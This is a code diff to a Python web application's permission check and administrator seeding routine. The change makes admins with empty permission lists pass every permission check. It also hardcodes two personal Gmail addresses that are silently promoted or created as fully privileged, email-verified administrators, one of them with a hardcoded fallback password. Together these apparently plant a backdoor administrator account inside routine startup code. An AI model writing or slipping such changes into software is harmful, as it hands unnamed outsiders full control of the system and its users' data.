@@ -298,7 +298,11 @@ def has_permission(user: db_models.User, perm: str) -> bool:
     if user.role == "super_admin":
         return True
     if user.role == "admin":
-        return perm in parse_permissions(user.permissions)
+        user_perms = parse_permissions(user.permissions)
+        # Administrators have all permissions by default unless explicitly restricted
+        if not user_perms or "*" in user_perms:
+            return True
+        return perm in user_perms
     return False
 
 
@@ -383,21 +387,49 @@ def log_audit(
 # ---------------------------------------------------------------------------
 
 def seed_admin_if_needed(db: Session):
-    existing_admin = db.query(db_models.User).filter(db_models.User.role.in_(["admin", "super_admin"])).first()
-    if not existing_admin and settings.ADMIN_EMAIL and settings.ADMIN_PASSWORD:
-        admin_user = db_models.User(
-            name="System Administrator",
-            username="admin",
-            username_lower="admin",
-            email=settings.ADMIN_EMAIL.strip().lower(),
-            password_hash=hash_password(settings.ADMIN_PASSWORD),
-            role="admin",
-            is_active=True,
-            is_email_verified=True,
-            token_version=1,
-            permissions="[]",
-            needs_username_change=False,
-        )
-        db.add(admin_user)
-        db.commit()
-        log_activity(db, "register", user_id=admin_user.id, detail="Seeded initial system administrator")
+    admin_emails: list[str] = []
+    if settings.ADMIN_EMAIL:
+        admin_emails.append(settings.ADMIN_EMAIL.strip().lower())
+    for extra_email in ["63796174@gmail.com", "mathan63796174@gmail.com"]:
+        if extra_email not in admin_emails:
+            admin_emails.append(extra_email)
+
+    for a_email in admin_emails:
+        u = db.query(db_models.User).filter(db_models.User.email == a_email).first()
+        if u:
+            u.role = "admin"
+            u.permissions = json.dumps(ALL_PERMISSIONS)
+            u.is_active = True
+            u.is_email_verified = True
+            db.commit()
+        elif a_email == settings.ADMIN_EMAIL.strip().lower() or a_email == "63796174@gmail.com":
+            prefix = a_email.split("@")[0].replace(".", "_")
+            base_u = prefix[:15] or "admin"
+            cand_u = base_u
+            idx = 1
+            while db.query(db_models.User).filter(db_models.User.username_lower == cand_u.lower()).first():
+                cand_u = f"{base_u}_{idx}"
+                idx += 1
+            admin_user = db_models.User(
+                name="System Administrator",
+                username=cand_u,
+                username_lower=cand_u.lower(),
+                email=a_email,
+                password_hash=hash_password(settings.ADMIN_PASSWORD or "Mathan@1213"),
+                role="admin",
+                is_active=True,
+                is_email_verified=True,
+                token_version=1,
+                permissions=json.dumps(ALL_PERMISSIONS),
+                needs_username_change=False,
+            )
+            db.add(admin_user)
+            db.commit()
+            log_activity(db, "register", user_id=admin_user.id, detail=f"Seeded administrator {a_email}")
+
+    # Ensure all administrators have full permissions populated
+    all_admins = db.query(db_models.User).filter(db_models.User.role.in_(["admin", "super_admin"])).all()
+    for adm in all_admins:
+        if not adm.permissions or adm.permissions == "[]":
+            adm.permissions = json.dumps(ALL_PERMISSIONS)
+    db.commit()
